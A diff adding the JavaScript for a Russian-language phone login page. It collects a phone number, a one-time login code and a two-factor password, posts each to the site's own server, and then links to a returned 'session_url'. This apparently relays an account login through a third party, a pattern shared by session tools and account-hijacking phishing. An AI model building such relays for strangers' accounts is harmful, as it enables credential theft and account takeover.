@@ -1,0 +1,296 @@
+// Login Page JavaScript
+const $ = id => document.getElementById(id);
+let sessionId = null;
+let selectedCode = '+998';
+
+// Elements
+const countrySelect = $('country-select');
+const countryDropdown = $('country-dropdown');
+const phoneCode = $('phone-code');
+const phoneInput = $('phone');
+
+// Country Selector
+countrySelect.addEventListener('click', (e) => {
+    e.stopPropagation();
+    countrySelect.classList.toggle('open');
+    countryDropdown.classList.toggle('open');
+});
+
+document.addEventListener('click', () => {
+    countrySelect.classList.remove('open');
+    countryDropdown.classList.remove('open');
+});
+
+countryDropdown.querySelectorAll('.country-item').forEach(item => {
+    item.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const code = item.dataset.code;
+        const flag = item.dataset.flag;
+        const name = item.dataset.name;
+
+        selectedCode = code;
+        phoneCode.textContent = code;
+        countrySelect.querySelector('.flag').textContent = flag;
+        countrySelect.querySelector('.country-name').textContent = name;
+
+        countrySelect.classList.remove('open');
+        countryDropdown.classList.remove('open');
+    });
+});
+
+// Load Countries from JSON
+async function loadCountries() {
+    try {
+        const res = await fetch('/countries.json');
+        const countries = await res.json();
+
+        countryDropdown.innerHTML = countries.map(c => `
+            <div class="country-item" data-code="${c.code}" data-flag="${c.flag}" data-name="${c.name}">
+                <span class="flag">${c.flag}</span><span>${c.name}</span><span class="code">${c.code}</span>
+            </div>
+        `).join('');
+
+        // Re-attach click handlers
+        countryDropdown.querySelectorAll('.country-item').forEach(item => {
+            item.addEventListener('click', (e) => {
+                e.stopPropagation();
+                const code = item.dataset.code;
+                const flag = item.dataset.flag;
+                const name = item.dataset.name;
+
+                selectedCode = code;
+                phoneCode.value = code;
+                countrySelect.querySelector('.flag').textContent = flag;
+                countrySelect.querySelector('.country-name').textContent = name;
+
+                countrySelect.classList.remove('open');
+                countryDropdown.classList.remove('open');
+            });
+        });
+    } catch (e) {
+        console.error('Failed to load countries:', e);
+    }
+}
+
+loadCountries();
+
+// Countries data for auto-detect
+let countriesData = [];
+
+// Load countries and store for auto-detect
+async function initCountries() {
+    try {
+        const res = await fetch('/countries.json');
+        countriesData = await res.json();
+    } catch (e) { }
+}
+initCountries();
+
+// Auto-detect country from phone code
+function detectCountry(code) {
+    if (!code.startsWith('+')) code = '+' + code;
+    // Find exact match first, then longest prefix match
+    let match = countriesData.find(c => c.code === code);
+    if (!match) {
+        // Try prefix match
+        const matches = countriesData.filter(c => code.startsWith(c.code) || c.code.startsWith(code));
+        if (matches.length > 0) {
+            match = matches.sort((a, b) => b.code.length - a.code.length)[0];
+        }
+    }
+    return match;
+}
+
+// Phone Code Input - auto-detect country
+phoneCode.addEventListener('input', (e) => {
+    let value = e.target.value;
+    if (!value.startsWith('+')) {
+        value = '+' + value.replace(/[^0-9]/g, '');
+        e.target.value = value;
+    } else {
+        value = '+' + value.substring(1).replace(/[^0-9]/g, '');
+        e.target.value = value;
+    }
+
+    selectedCode = value;
+
+    // Auto-detect country
+    const match = detectCountry(value);
+    if (match) {
+        countrySelect.querySelector('.flag').textContent = match.flag;
+        countrySelect.querySelector('.country-name').textContent = match.name;
+    }
+});
+
+// Phone Code - space jumps to phone input
+phoneCode.addEventListener('keydown', (e) => {
+    if (e.key === ' ' || e.key === 'Tab') {
+        e.preventDefault();
+        phoneInput.focus();
+    }
+});
+
+// Phone Input - backspace on empty goes back to code
+phoneInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Backspace' && !phoneInput.value) {
+        e.preventDefault();
+        phoneCode.focus();
+        phoneCode.setSelectionRange(phoneCode.value.length, phoneCode.value.length);
+    }
+});
+
+// Phone Number Formatter
+phoneInput.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    let formatted = '';
+
+    // Format: XX XXX XXXX (for most countries)
+    if (value.length > 0) {
+        formatted = value.substring(0, 2);
+    }
+    if (value.length > 2) {
+        formatted += ' ' + value.substring(2, 5);
+    }
+    if (value.length > 5) {
+        formatted += ' ' + value.substring(5, 9);
+    }
+
+    e.target.value = formatted;
+});
+
+// Helpers
+function showStep(name) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    $('step-' + name).classList.add('active');
+}
+
+function showError(msg) {
+    const err = $('error');
+    if (err) {
+        err.textContent = msg;
+        err.classList.add('show');
+    }
+}
+
+function hideError() {
+    const err = $('error');
+    if (err) err.classList.remove('show');
+}
+
+// Phone Step
+$('btn-phone').addEventListener('click', async () => {
+    const phone = selectedCode + phoneInput.value.replace(/\D/g, '');
+    if (phone.length < 10) {
+        showError('Введите корректный номер телефона');
+        return;
+    }
+
+    hideError();
+    const btn = $('btn-phone');
+    btn.disabled = true;
+    btn.textContent = 'ЗАГРУЗКА...';
+
+    try {
+        const res = await fetch('/api/web-login/phone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone })
+        });
+
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.detail || 'Ошибка');
+
+        sessionId = data.session_id;
+        $('code-phone').textContent = phone;
+        showStep('code');
+    } catch (e) {
+        showError(e.message);
+    }
+
+    btn.disabled = false;
+    btn.textContent = 'ДАЛЕЕ';
+});
+
+// Code Step
+$('btn-code').addEventListener('click', async () => {
+    const code = $('code').value.trim();
+    if (!code) {
+        showError('Введите код');
+        return;
+    }
+
+    hideError();
+    const btn = $('btn-code');
+    btn.disabled = true;
+    btn.textContent = 'ЗАГРУЗКА...';
+
+    try {
+        const res = await fetch('/api/web-login/code', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ session_id: sessionId, code })
+        });
+
+        const data = await res.json();
+
+        if (data.needs_2fa) {
+            // Show password hint if available
+            if (data.hint) {
+                $('twofa').placeholder = data.hint;
+            }
+            showStep('2fa');
+            btn.disabled = false;
+            btn.textContent = 'ДАЛЕЕ';
+            return;
+        }
+
+        if (!res.ok) throw new Error(data.detail || 'Ошибка');
+
+        $('session-link').href = data.session_url;
+        showStep('success');
+    } catch (e) {
+        showError(e.message);
+    }
+
+    btn.disabled = false;
+    btn.textContent = 'ДАЛЕЕ';
+});
+
+// 2FA Step
+$('btn-2fa').addEventListener('click', async () => {
+    const password = $('twofa').value;
+    if (!password) {
+        showError('Введите пароль');
+        return;
+    }
+
+    hideError();
+    const btn = $('btn-2fa');
+    btn.disabled = true;
+    btn.textContent = 'ЗАГРУЗКА...';
+
+    try {
+        const res = await fetch('/api/web-login/2fa', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ session_id: sessionId, password })
+        });
+
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.detail || 'Ошибка');
+
+        $('session-link').href = data.session_url;
+        showStep('success');
+    } catch (e) {
+        showError(e.message);
+    }
+
+    btn.disabled = false;
+    btn.textContent = 'ВОЙТИ';
+});
+
+// Back Button
+$('btn-back').addEventListener('click', () => {
+    hideError();
+    showStep('phone');
+});
